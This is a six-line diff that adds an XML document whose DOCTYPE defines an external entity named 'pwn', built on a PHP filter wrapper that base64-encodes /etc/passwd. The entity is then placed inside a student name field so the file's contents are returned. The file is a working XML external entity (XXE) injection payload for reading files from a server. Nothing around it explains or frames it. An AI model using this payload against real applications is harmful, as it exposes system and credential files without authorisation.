@@ -1,0 +1,6 @@
+ <!DOCTYPE student [
+    <!ENTITY pwn SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+   ]>
+   <student>
+       <name>&pwn;</name>
+   </student>
